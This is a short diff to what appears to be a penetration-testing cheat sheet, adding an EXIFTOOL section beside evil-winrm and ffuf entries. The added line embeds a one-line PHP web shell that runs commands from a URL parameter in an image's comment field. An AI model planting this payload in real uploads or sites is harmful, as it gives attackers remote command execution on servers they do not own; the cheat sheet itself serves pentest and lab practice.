@@ -477,6 +477,14 @@ evil-winrm -i IP_here -u user -p password
 
 
 
+## EXIFTOOL
+```
+# add php web shell to image
+exiftool -Comment='<?php system($_GET['cmd']); ?>' /path/to/image/here
+```
+
+
+
 ## FFUF
 ```
 # enumerate files
